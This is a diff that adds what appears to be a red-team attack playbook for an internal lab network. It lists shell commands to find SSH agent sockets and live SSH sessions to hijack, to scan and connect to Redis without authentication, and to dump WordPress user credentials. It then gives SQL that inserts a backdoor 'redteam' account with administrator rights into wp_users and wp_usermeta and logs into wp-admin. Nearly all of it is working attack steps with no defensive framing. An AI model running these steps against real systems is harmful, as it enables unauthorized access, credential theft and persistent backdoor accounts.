@@ -1,0 +1,48 @@
+# Look for active SSH agent sockets
+echo $SSH_AUTH_SOCK
+ls -la /tmp/ssh-*
+
+# Look for established SSH connections you can hijack
+netstat -antp | grep :22 | grep ESTABLISHED
+ss -antp | grep :22
+
+# Find Redis instances
+nmap -p 6379 svc-redis-01 svc-database-01
+
+# Try to connect without auth
+redis-cli -h svc-redis-01
+# Once connected, try:
+INFO
+CONFIG GET *
+KEYS *
+
+------------------------------------------------------
+-- See all databases
+SHOW DATABASES;
+
+-- Look for application databases
+USE wordpress;  -- for svc-amazin-01
+SHOW TABLES;
+SELECT * FROM wp_users;
+
+-- Look for stored credentials
+SELECT * FROM wp_users;
+-- WordPress hashes are MD5-based, but you might find other creds
+
+-- Check if MySQL can reach other hosts
+SELECT host, user FROM mysql.user;
+
+USE (database);
+INSERT INTO wp_users (user_login, user_pass, user_email, user_status) 
+VALUES ('redteam', MD5('YourPassword123'), 'red@team.com', 0);
+
+-- Get the new user ID
+SELECT ID FROM wp_users WHERE user_login = 'redteam';
+
+-- Grant admin privileges (replace USER_ID with the ID from above)
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
+VALUES (USER_ID, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}');
+
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value) 
+VALUES (USER_ID, 'wp_user_level', '10');
+Then access WordPress admin panel at http://svc-amazin-01/wp-admin with your new creds.
